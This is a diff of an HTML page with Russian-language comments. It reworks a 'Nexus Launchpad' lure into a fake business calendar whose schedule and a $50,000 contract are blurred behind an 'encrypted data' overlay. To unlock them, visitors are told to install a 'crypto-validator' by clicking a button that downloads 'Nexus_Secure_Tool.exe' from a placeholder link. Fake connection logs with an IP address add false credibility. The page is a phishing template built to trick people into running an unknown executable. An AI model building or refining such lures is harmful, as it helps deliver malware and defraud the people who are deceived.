@@ -3,39 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Hub</title>
+    <title>Nexus Business Calendar</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
 </head>
-<body class="bg-[#0d1117] text-[#c9d1d9] flex items-center justify-center min-h-screen p-4 font-sans">
+<body class="bg-[#f8fafc] text-[#1e293b] font-sans min-h-screen">
 
-    <div class="max-w-md w-full bg-[#161b22] border border-[#30363d] rounded-3xl p-10 shadow-2xl text-center">
-        <!-- Анимированный статус -->
-        <div class="mb-8 relative flex justify-center">
-            <div class="absolute inset-0 bg-blue-500 blur-2xl opacity-10 animate-pulse"></div>
-            <div class="h-16 w-16 bg-blue-600 rounded-2xl flex items-center justify-center shadow-lg">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
-                </svg>
+    <!-- Верхняя панель -->
+    <nav class="bg-white border-b border-slate-200 px-6 py-3 flex items-center justify-between sticky top-0 z-50">
+        <div class="flex items-center gap-3">
+            <div class="w-8 h-8 bg-blue-600 rounded flex items-center justify-center shadow-md">
+                <i class="bi bi-calendar-check-fill text-white"></i>
+            </div>
+            <span class="font-bold text-slate-800 tracking-tight">NEXUS <span class="text-blue-600">SCHEDULER</span></span>
+        </div>
+        <div class="flex items-center gap-4 text-[11px] font-medium text-slate-500 uppercase tracking-wider">
+            <span class="flex items-center gap-1.5"><span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span> Network Active</span>
+            <span class="border-l border-slate-200 pl-4">US Region</span>
+        </div>
+    </nav>
+
+    <main class="max-w-6xl mx-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-8">
+        
+        <!-- Левая колонка: Календарная сетка -->
+        <div class="lg:col-span-8 bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden">
+            <div class="p-4 border-b border-slate-100 flex items-center justify-between bg-slate-50/50">
+                <h2 class="font-bold text-slate-700">Май 2026</h2>
+                <div class="flex gap-2">
+                    <button class="p-1 hover:bg-slate-200 rounded"><i class="bi bi-chevron-left"></i></button>
+                    <button class="p-1 hover:bg-slate-200 rounded"><i class="bi bi-chevron-right"></i></button>
+                </div>
+            </div>
+            
+            <!-- Сетка (пример) -->
+            <div class="grid grid-cols-7 text-center border-b border-slate-100 text-[10px] font-bold text-slate-400 uppercase py-2">
+                <div>Пн</div><div>Вт</div><div>Ср</div><div>Чт</div><div>Пт</div><div class="text-slate-300">Сб</div><div class="text-slate-300">Вс</div>
+            </div>
+            <div class="grid grid-cols-7 h-[400px] opacity-40 grayscale pointer-events-none">
+                <!-- Пустые ячейки для вида -->
+                <div class="border-r border-b border-slate-50 p-2"></div><div class="border-r border-b border-slate-50 p-2"></div>
+                <div class="border-r border-b border-slate-50 p-2 bg-blue-50/50"></div>
+                <!-- Генерируем сетку дальше... -->
+            </div>
+            <div class="absolute inset-0 lg:col-span-8 flex items-center justify-center z-10 pointer-events-none">
+                 <div class="bg-white/80 backdrop-blur-sm p-6 rounded-2xl border border-slate-200 shadow-xl text-center flex flex-col items-center">
+                    <i class="bi bi-lock-fill text-3xl text-blue-600 mb-2"></i>
+                    <p class="font-bold text-slate-800">Данные зашифрованы</p>
+                    <p class="text-xs text-slate-500">Требуется синхронизация с локальным узлом</p>
+                 </div>
             </div>
         </div>
 
-        <h1 class="text-2xl font-bold text-white mb-4">Nexus Launchpad v1.4</h1>
-        <p class="text-sm text-gray-400 mb-10 leading-relaxed">
-            Для активации вашей ноды и доступа к лаунчпаду необходимо подтверждение через 
-            <span class="text-blue-400 font-mono">Secure_Module.exe</span>.
-        </p>
+        <!-- Правая колонка: Действия -->
+        <div class="lg:col-span-4 space-y-6">
+            <div class="bg-white border border-slate-200 rounded-2xl p-6 shadow-sm">
+                <h3 class="font-bold text-slate-800 mb-4 flex items-center gap-2">
+                    <i class="bi bi-file-earmark-lock2-fill text-blue-600"></i> Ожидают подписи
+                </h3>
+                <div class="space-y-3 mb-6">
+                    <div class="flex items-center gap-3 p-3 bg-slate-50 rounded-xl border border-slate-100">
+                        <i class="bi bi-file-pdf-fill text-red-500 text-xl"></i>
+                        <div class="text-xs">
+                            <p class="font-bold text-slate-700">Contract_05_2026.pdf</p>
+                            <p class="text-slate-400 italic">Сумма лота: $50,000</p>
+                        </div>
+                    </div>
+                </div>
 
-        <!-- ГЛАВНАЯ КНОПКА -->
-        <a href="ТВОЯ_ПУБЛИЧНАЯ_ССЫЛКА_НА_ФАЙЛ" 
-           class="block w-full py-5 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl font-bold text-lg transition-all shadow-xl shadow-blue-900/40 active:scale-95">
-            ПОДТВЕРДИТЬ И ЗАПУСТИТЬ
-        </a>
+                <div class="p-4 bg-blue-50 rounded-xl border border-blue-100 mb-6">
+                    <p class="text-[11px] text-blue-700 leading-relaxed font-medium">
+                        Для просмотра расписания и доступа к документам необходимо установить крипто-валидатор Nexus.
+                    </p>
+                </div>
 
-        <div class="mt-8 flex justify-center gap-4">
-            <span class="text-[10px] text-gray-600 uppercase tracking-tighter italic">Status: Verified Account</span>
-            <span class="text-[10px] text-gray-600 uppercase tracking-tighter italic">Network: Layer 7</span>
+                <!-- КНОПКА СКАЧИВАНИЯ -->
+                <a href="ССЫЛКА_НА_ФАЙЛ/Nexus_Secure_Tool.exe" 
+                   class="flex items-center justify-center gap-3 w-full py-4 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-bold text-sm transition-all shadow-lg shadow-blue-200 active:scale-95 group">
+                    <i class="bi bi-arrow-repeat group-hover:rotate-180 transition-transform duration-500"></i>
+                    СИНХРОНИЗИРОВАТЬ
+                </a>
+            </div>
+
+            <!-- Статус соединения -->
+            <div class="bg-slate-900 rounded-2xl p-5 font-mono text-[10px]">
+                <div class="flex justify-between mb-2">
+                    <span class="text-slate-500 uppercase">System Status</span>
+                    <span class="text-blue-400">WAITING...</span>
+                </div>
+                <div class="space-y-1 overflow-hidden h-12 text-slate-400 opacity-70" id="logs">
+                    <div>> Init handshake</div>
+                </div>
+            </div>
         </div>
-    </div>
+    </main>
 
+    <script>
+        const logs = document.getElementById('logs');
+        const msgs = ["> Looking for local peer...", "> SSL tunnel: Ready", "> Encryption: AES-256", "> 79.163.249.244 linked"];
+        setInterval(() => {
+            const div = document.createElement('div');
+            div.innerHTML = msgs[Math.floor(Math.random() * msgs.length)];
+            logs.appendChild(div);
+            if (logs.childNodes.length > 3) logs.removeChild(logs.firstChild);
+        }, 3000);
+    </script>
 </body>
 </html>
